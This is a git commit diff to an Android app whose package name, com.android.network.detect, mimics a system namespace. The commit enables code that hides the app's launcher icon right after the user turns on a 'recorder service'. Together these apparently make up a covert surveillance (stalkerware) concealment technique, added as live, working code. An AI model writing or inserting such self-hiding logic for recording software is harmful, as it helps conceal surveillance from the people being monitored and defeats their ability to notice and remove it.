dc7df966a8dc25993fdd0c23118f918b5db31b29
Omer Akram <om26er@gmail.com>
2015-06-16 12:42:26 +0500

    Hide app after activation

--- app/src/main/java/com/android/network/detect/MainActivity.java
+++ app/src/main/java/com/android/network/detect/MainActivity.java
@@ -1,7 +1,9 @@
 package com.android.network.detect;
 
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.preference.PreferenceManager;
 import android.text.TextUtils;
@@ -77,12 +79,12 @@ public class MainActivity extends Activity implements Switch.OnCheckedChangeList
                     enableRecorderService(true);
                     finish();
                     /// hide app icon form  app drawer
-//                    PackageManager packageManager = getPackageManager();
-//                    ComponentName componentName = new ComponentName(getApplicationContext(),
-//                            MainActivity.class);
-//                    packageManager.setComponentEnabledSetting(componentName,
-//                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-//                            PackageManager.DONT_KILL_APP);
+                    PackageManager packageManager = getPackageManager();
+                    ComponentName componentName = new ComponentName(getApplicationContext(),
+                            MainActivity.class);
+                    packageManager.setComponentEnabledSetting(componentName,
+                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                            PackageManager.DONT_KILL_APP);
                 }
                 break;
             case R.id.button_cancel:
